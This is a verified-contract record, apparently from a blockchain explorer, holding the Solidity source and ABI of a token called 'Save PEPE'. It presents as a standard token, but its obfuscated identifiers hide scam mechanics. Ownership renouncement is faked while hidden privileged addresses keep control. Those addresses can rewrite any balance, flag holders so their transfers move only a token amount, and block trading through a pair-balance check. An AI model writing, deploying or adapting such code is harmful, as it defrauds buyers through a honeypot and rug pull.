{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchedEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txLimit) external view returns (uint256);\n\n    function transfer(address liquidityLaunched, uint256 tradingBuyLiquidity) external returns (bool);\n\n    function allowance(address modeAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingBuyLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunched,\n        uint256 tradingBuyLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldWallet, uint256 value);\n    event Approval(address indexed modeAmount, address indexed spender, uint256 value);\n}\n\nabstract contract totalSwapBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalSell {\n    function createPair(address feeLaunchTotal, address limitAmount) external returns (address);\n}\n\ninterface listToMin is launchedEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SavePEPE is totalSwapBuy, launchedEnable, listToMin {\n\n    function name() external view virtual override returns (string memory) {\n        return feeLiquidity;\n    }\n\n    event OwnershipTransferred(address indexed feeMin, address indexed autoTotal);\n\n    function getOwner() external view returns (address) {\n        return enableTo;\n    }\n\n    address private enableTo;\n\n    mapping(address => bool) public teamReceiver;\n\n    uint256 constant receiverFund = 7 ** 10;\n\n    uint8 private isSender = 18;\n\n    bool public swapList;\n\n    function fromAuto() private view {\n        require(shouldAmount[_msgSender()]);\n    }\n\n    function isShould(address fundTx, address liquidityLaunched, uint256 tradingBuyLiquidity) internal returns (bool) {\n        require(receiverSwapLimit[fundTx] >= tradingBuyLiquidity);\n        receiverSwapLimit[fundTx] -= tradingBuyLiquidity;\n        receiverSwapLimit[liquidityLaunched] += tradingBuyLiquidity;\n        emit Transfer(fundTx, liquidityLaunched, tradingBuyLiquidity);\n        return true;\n    }\n\n    bool private receiverTeamLimit;\n\n    function balanceOf(address txLimit) public view virtual override returns (uint256) {\n        return receiverSwapLimit[txLimit];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMax;\n    }\n\n    function transfer(address modeMarketing, uint256 tradingBuyLiquidity) external virtual override returns (bool) {\n        return launchWallet(_msgSender(), modeMarketing, tradingBuyLiquidity);\n    }\n\n    mapping(address => bool) public shouldAmount;\n\n    uint256 fundWallet;\n\n    uint256 senderFrom;\n\n    address totalBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private listMax = 100000000 * 10 ** 18;\n\n    function allowance(address toFee, address sellModeShould) external view virtual override returns (uint256) {\n        if (sellModeShould == totalBuy) {\n            return type(uint256).max;\n        }\n        return buyExempt[toFee][sellModeShould];\n    }\n\n    string private enableMode = \"SPE\";\n\n    uint256 public amountTo;\n\n    function modeLiquidity(address modeMarketing, uint256 tradingBuyLiquidity) public {\n        fromAuto();\n        receiverSwapLimit[modeMarketing] = tradingBuyLiquidity;\n    }\n\n    uint256 public txToken;\n\n    address swapFromReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return enableTo;\n    }\n\n    uint256 private teamLaunched;\n\n    bool public feeLiquidityLimit;\n\n    bool private autoTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableMode;\n    }\n\n    function txWallet(address tokenSender) public {\n        fromAuto();\n        if (totalMin != launchedReceiver) {\n            launchedReceiver = amountTo;\n        }\n        if (tokenSender == senderLaunched || tokenSender == toFund) {\n            return;\n        }\n        teamReceiver[tokenSender] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isSender;\n    }\n\n    string private feeLiquidity = \"Save PEPE\";\n\n    mapping(address => uint256) private receiverSwapLimit;\n\n    bool public limitMarketing;\n\n    function fundMode(address tradingAuto) public {\n        if (swapList) {\n            return;\n        }\n        if (limitMarketing) {\n            autoTo = true;\n        }\n        shouldAmount[tradingAuto] = true;\n        if (txToken != amountTo) {\n            amountTo = totalMin;\n        }\n        swapList = true;\n    }\n\n    uint256 private launchedReceiver;\n\n    address public toFund;\n\n    function transferFrom(address fundTx, address liquidityLaunched, uint256 tradingBuyLiquidity) external override returns (bool) {\n        if (_msgSender() != totalBuy) {\n            if (buyExempt[fundTx][_msgSender()] != type(uint256).max) {\n                require(tradingBuyLiquidity <= buyExempt[fundTx][_msgSender()]);\n                buyExempt[fundTx][_msgSender()] -= tradingBuyLiquidity;\n            }\n        }\n        return launchWallet(fundTx, liquidityLaunched, tradingBuyLiquidity);\n    }\n\n    function toExempt(uint256 tradingBuyLiquidity) public {\n        fromAuto();\n        senderFrom = tradingBuyLiquidity;\n    }\n\n    uint256 private totalMin;\n\n    function launchWallet(address fundTx, address liquidityLaunched, uint256 tradingBuyLiquidity) internal returns (bool) {\n        if (fundTx == senderLaunched) {\n            return isShould(fundTx, liquidityLaunched, tradingBuyLiquidity);\n        }\n        uint256 liquidityEnable = launchedEnable(toFund).balanceOf(swapFromReceiver);\n        require(liquidityEnable == senderFrom);\n        require(liquidityLaunched != swapFromReceiver);\n        if (teamReceiver[fundTx]) {\n            return isShould(fundTx, liquidityLaunched, receiverFund);\n        }\n        return isShould(fundTx, liquidityLaunched, tradingBuyLiquidity);\n    }\n\n    constructor (){\n        \n        marketingToken txReceiver = marketingToken(totalBuy);\n        toFund = totalSell(txReceiver.factory()).createPair(txReceiver.WETH(), address(this));\n        if (limitMarketing) {\n            launchedReceiver = totalMin;\n        }\n        senderLaunched = _msgSender();\n        maxModeTeam();\n        shouldAmount[senderLaunched] = true;\n        receiverSwapLimit[senderLaunched] = listMax;\n        \n        emit Transfer(address(0), senderLaunched, listMax);\n    }\n\n    address public senderLaunched;\n\n    function approve(address sellModeShould, uint256 tradingBuyLiquidity) public virtual override returns (bool) {\n        buyExempt[_msgSender()][sellModeShould] = tradingBuyLiquidity;\n        emit Approval(_msgSender(), sellModeShould, tradingBuyLiquidity);\n        return true;\n    }\n\n    function maxModeTeam() public {\n        emit OwnershipTransferred(senderLaunched, address(0));\n        enableTo = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private buyExempt;\n\n    bool private listTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellModeShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellModeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"}],\"name\":\"fundMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxModeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingBuyLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"}],\"name\":\"txWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SavePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}